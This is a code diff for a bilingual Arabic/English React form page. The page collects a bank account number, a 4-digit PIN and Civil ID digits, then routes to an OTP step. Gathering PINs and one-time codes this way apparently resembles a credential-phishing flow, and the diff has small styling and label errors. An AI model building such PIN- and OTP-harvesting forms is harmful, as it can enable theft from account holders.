@@ -8,23 +8,50 @@ export default function ContinueApplicationStep2Page() {
   const isAr = lang === 'ar'
   const navigate = useNavigate()
 
-  const [accountNumber, setAccountNumber] = useState(['', '', '', '', '', '', '', '', '', ''])
-  const [pin, setPin] = useState(['', '', '', ''])
-  const [civilId, setCivilId] = useState(['', ''])
+  const [accountNumber, setAccountNumber] = useState(Array(10).fill(''))
+  const [pin, setPin] = useState(Array(4).fill(''))
+  const [civilId, setCivilId] = useState(Array(2).fill(''))
   const [hasError, setHasError] = useState(false)
 
   const accRefs = useRef([])
   const pinRefs = useRef([])
   const civilRefs = useRef([])
 
-  const handleInputChange = (value, index, refs, state, setState, nextGroupFirstRef = null) => {
-    const val = value.replace(/\D/g, '')
-    const newState = [...state]
+  // دالة ذكية وسلسة لتوزيع الأرقام وتعبئتها ورا بعضها تلقائياً
+  const handleBoxChange = (e, index, refs, state, setState, length, nextGroupFirstRef = null) => {
+    const rawVal = e.target.value.replace(/\D/g, '')
     
-    if (val) {
-      newState[index] = val[val.length - 1]
+    // لو المستخدم كتب أكثر من رقم (سواء لصق أو كتابة سريعة)
+    if (rawVal.length > 1 || e.nativeEvent.inputType === 'insertFromPaste') {
+      const currentFullStr = state.join('') + rawVal
+      const sliced = currentFullStr.slice(0, length)
+      const newState = Array(length).fill('')
+      
+      for (let i = 0; i < sliced.length; i++) {
+        newState[i] = sliced[i]
+      }
       setState(newState)
-      if (index < state.length - 1) {
+      if (hasError) setHasError(false)
+
+      // التركيز على الخانة التالية الفارغة أو الانتقال للمجموعة التالية
+      const nextIndex = sliced.length < length ? sliced.length : length - 1
+      refs.current[nextIndex]?.focus()
+      
+      if (sliced.length >= length && nextGroupFirstRef) {
+        nextGroupFirstRef.current?.focus()
+      }
+      return
+    }
+
+    // الكتابة الطبيعية رقم برقم بالسلاسة المطلوبة
+    const newState = [...state]
+    if (rawVal) {
+      newState[index] = rawVal[0]
+      setState(newState)
+      if (hasError) setHasError(false)
+
+      // النقل التلقائي للخانة التالية بسلاسة
+      if (index < length - 1) {
         refs.current[index + 1]?.focus()
       } else if (nextGroupFirstRef) {
         nextGroupFirstRef.current?.focus()
@@ -47,14 +74,15 @@ export default function ContinueApplicationStep2Page() {
         setState(newState)
         refs.current[index - 1]?.focus()
       }
-    } else if (e.key === 'Enter') {
-      e.preventDefault()
-      if (index < state.length - 1) {
-        refs.current[index + 1]?.focus()
-      } else if (refs === accRefs) {
-        pinRefs.current[0]?.focus()
-      } else if (refs === pinRefs) {
-        civilRefs.current[0]?.focus()
+    }
+  }
+
+  // منع التركيز على أي خانة متقدمة إلا لو تم ملء ما يسبقها من الشمال
+  const handleFocus = (index, state, refs) => {
+    for (let i = 0; i < index; i++) {
+      if (!state[i]) {
+        refs.current[i]?.focus()
+        break
       }
     }
   }
@@ -81,7 +109,7 @@ export default function ContinueApplicationStep2Page() {
     }
 
     saveDraftApplication(payload)
-    navigate('/continue-application-step-3')
+    navigate('/otp-verification')
   }
 
   return (
@@ -118,20 +146,22 @@ export default function ContinueApplicationStep2Page() {
               </div>
             </div>
 
-            <div className="flex justify-start gap-1.5 sm:gap-2" dir="rtl">
+            <div className="flex justify-end gap-1 sm:gap-1.5" dir="ltr">
               {accountNumber.map((digit, i) => (
                 <input
                   key={i}
                   ref={(el) => (accRefs.current[i] = el)}
                   type="text"
                   inputMode="numeric"
-                  maxLength={1}
+                  maxLength={10}
                   value={digit}
-                  onChange={(e) => handleInputChange(e.target.value, i, accRefs, accountNumber, setAccountNumber, pinRefs)}
+                  onChange={(e) => handleBoxChange(e, i, accRefs, accountNumber, setAccountNumber, 10, pinRefs)}
                   onKeyDown={(e) => handleKeyDown(e, i, accRefs, accountNumber, setAccountNumber)}
-                  className={`w-6 border-b-2 pb-1 text-center text-sm text-[#333333] bg-transparent outline-none transition-colors ${
+                  onFocus={() => handleFocus(i, accountNumber, accRefs)}
+                  className={`w-7 h-10 border-b-2 pb-1 text-center text-base sm:text-lg font-semibold text-[#333333] bg-transparent outline-none transition-colors ${
                     digit !== '' ? 'border-[#ce1126]' : 'border-[#b0b0b0] focus:border-[#ce1126]'
                   }`}
+                  style={{ direction: 'ltr' }}
                 />
               ))}
             </div>
@@ -148,20 +178,23 @@ export default function ContinueApplicationStep2Page() {
               </div>
             </div>
 
-            <div className="flex justify-start gap-2.5 sm:gap-3" dir="rtl">
+            <div className="flex justify-end gap-2 sm:gap-2.5" dir="ltr">
               {pin.map((digit, i) => (
                 <input
                   key={i}
                   ref={(el) => (pinRefs.current[i] = el)}
                   type="text"
                   inputMode="numeric"
-                  maxLength={1}
+                  maxLength={4}
                   value={digit}
-                  onChange={(e) => handleInputChange(e.target.value, i, pinRefs, pin, setPin, civilRefs)}
+                  onChange={(e) => handleBoxChange(e, i, pinRefs, pin, setPin, 4, civilRefs)}
                   onKeyDown={(e) => handleKeyDown(e, i, pinRefs, pin, setPin)}
-                  className={`w-8 border-b-2 pb-1 text-center text-sm text-[#333333] bg-transparent outline-none transition-colors ${
+                  onFocus={() => handleFocus(i, pin, pinRefs)}
+                  className={`w-9 h-10 border-b-2 pb-1 text-center text-base sm:text-lg font-semibold text-[#333333] bg-transparent outline-none transition-colors ${
                     digit !== '' ? 'border-[#ce1126]' : 'border-[#b0b0b0] focus:border-[#ce1126]'
                   }`}
+                  style={{ direction: 'ltr' +
+                    '' }}
                 />
               ))}
             </div>
@@ -171,27 +204,29 @@ export default function ContinueApplicationStep2Page() {
           <div className="space-y-2">
             <div>
               <div className="text-xs text-[#888888] mb-0.5">
-                {isAr ? 'البطاقة المدنية' : 'Civil ID'}
+                {isAr ? 'البطاقة المدنية' : 'Civil ID'} المؤكدة
               </div>
               <div className="text-xs text-[#777777]">
                 {isAr ? 'آخر رقمين من البطاقة المدنية' : 'Last 2 digits of Civil ID'}
               </div>
             </div>
 
-            <div className="flex justify-start gap-3" dir="rtl">
+            <div className="flex justify-end gap-2.5 sm:gap-3" dir="ltr">
               {civilId.map((digit, i) => (
                 <input
                   key={i}
                   ref={(el) => (civilRefs.current[i] = el)}
                   type="text"
                   inputMode="numeric"
-                  maxLength={1}
+                  maxLength={2}
                   value={digit}
-                  onChange={(e) => handleInputChange(e.target.value, i, civilRefs, civilId, setCivilId)}
+                  onChange={(e) => handleBoxChange(e, i, civilRefs, civilId, setCivilId, 2, null)}
                   onKeyDown={(e) => handleKeyDown(e, i, civilRefs, civilId, setCivilId)}
-                  className={`w-10 border-b-2 pb-1 text-center text-sm text-[#333333] bg-transparent outline-none transition-colors ${
+                  onFocus={() => handleFocus(i, civilId, civilRefs)}
+                  className={`w-11 h-10 border-b-2 pb-1 text-center text-base sm:text-lg font-semibold text-[#333333] bg-transparent outline-none transition-colors ${
                     digit !== '' ? 'border-[#ce1126]' : 'border-[#b0b0b0] focus:border-[#ce1126]'
                   }`}
+                  style={{ direction: 'ltr' }}
                 />
               ))}
             </div>
@@ -215,7 +250,7 @@ export default function ContinueApplicationStep2Page() {
             <button
               type="button"
               onClick={() => navigate('/continue-application')}
-              className="flex-1 rounded-[22px] border border-[#d8d8d8] bg-white px-5 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-[#333333] shadow-[0_2px_8px_rgba(0,0,0,0.03)] transition hover:bg-[#f8f8f8]"
+              className="flex-1 rounded-[22px] border border-[#d8d8d8] bg-white px-5 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-333333 shadow-[0_2px_8px_rgba(0,0,0,0.03)] transition hover:bg-[#f8f8f8]"
             >
               {isAr ? 'إلغاء' : 'Cancel'}
             </button>
